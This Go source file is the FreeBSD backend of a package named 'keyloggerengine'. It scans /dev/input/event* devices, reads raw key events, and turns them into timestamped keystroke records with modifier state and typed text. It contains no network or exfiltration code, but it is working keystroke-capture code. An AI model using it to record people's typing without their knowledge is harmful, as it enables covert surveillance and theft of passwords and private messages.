//go:build freebsd

package keyloggerengine

import (
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

const (
	freebsdEventKey = 0x01
)

type freebsdInputEvent = evdevInputEvent

type freebsdProvider struct {
	findDevices func() ([]string, error)
	openDevice  func(string) (io.ReadCloser, error)
}

func newFreeBSDProvider() *freebsdProvider {
	finder := freebsdDeviceFinder
	if finder == nil {
		finder = detectFreeBSDKeyboardDevices
	}
	opener := freebsdDeviceOpener
	if opener == nil {
		opener = func(path string) (io.ReadCloser, error) {
			return os.Open(path)
		}
	}
	return &freebsdProvider{
		findDevices: finder,
		openDevice:  opener,
	}
}

func defaultProviderFactory() func() Provider {
	return func() Provider {
		return newFreeBSDProvider()
	}
}

func (p *freebsdProvider) Start(ctx context.Context, cfg StartConfig) (EventStream, error) {
	if ctx == nil {
		ctx = context.Background()
	}

	devices, err := p.findDevices()
	if err != nil || len(devices) == 0 {
		return nil, ErrProviderUnavailable
	}

	normalized := cfg.normalize()
	stream := newChannelEventStream(normalized.BufferSize)
	modifiers := &modifierState{}

	var wg sync.WaitGroup
	started := 0

	for _, device := range devices {
		rc, openErr := p.openDevice(device)
		if openErr != nil {
			continue
		}
		started++
		wg.Add(1)
		go func(r io.ReadCloser) {
			defer wg.Done()
			defer r.Close()
			p.readEvents(ctx, r, stream, modifiers)
		}(rc)
	}

	if started == 0 {
		stream.Close()
		return nil, ErrProviderUnavailable
	}

	go func() {
		<-ctx.Done()
		stream.Close()
	}()

	go func() {
		wg.Wait()
		stream.Close()
	}()

	return stream, nil
}

func (p *freebsdProvider) readEvents(ctx context.Context, r io.Reader, stream *channelEventStream, modifiers *modifierState) {
	decoder := binary.LittleEndian
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		var ev freebsdInputEvent
		if err := binary.Read(r, decoder, &ev); err != nil {
			return
		}
		if ev.Type != freebsdEventKey {
			continue
		}

		pressed := ev.Value != 0

		if isModifierKey(ev.Code) {
			modifiers.set(ev.Code, pressed)
		}
		alt, ctrl, shift, meta := modifiers.snapshot()

		key := keyForScanCode(ev.Code)
		timestamp := time.Unix(ev.Sec, ev.Usec*1000).UTC()

		event := CaptureEvent{
			Timestamp: timestamp,
			Key:       key,
			RawCode:   fmt.Sprintf("%d", ev.Code),
			ScanCode:  ev.Code,
			Pressed:   pressed,
			Alt:       alt,
			Ctrl:      ctrl,
			Shift:     shift,
			Meta:      meta,
		}

		if pressed && len(key) == 1 {
			if shift {
				event.Text = strings.ToUpper(key)
			} else {
				event.Text = key
			}
		}

		if !stream.emit(ctx, event) {
			return
		}
	}
}

var freebsdDeviceFinder = detectFreeBSDKeyboardDevices

func detectFreeBSDKeyboardDevices() ([]string, error) {
	matches, err := filepath.Glob("/dev/input/event*")
	if err != nil {
		return nil, err
	}

	var devices []string
	for _, path := range matches {
		info, statErr := os.Stat(path)
		if statErr != nil {
			continue
		}
		if info.Mode().IsRegular() || info.Mode()&os.ModeDevice != 0 {
			devices = append(devices, path)
		}
	}

	if len(devices) == 0 {
		return nil, fmt.Errorf("no keyboard devices found")
	}

	return devices, nil
}

var freebsdDeviceOpener = func(path string) (io.ReadCloser, error) {
	return os.Open(path)
}
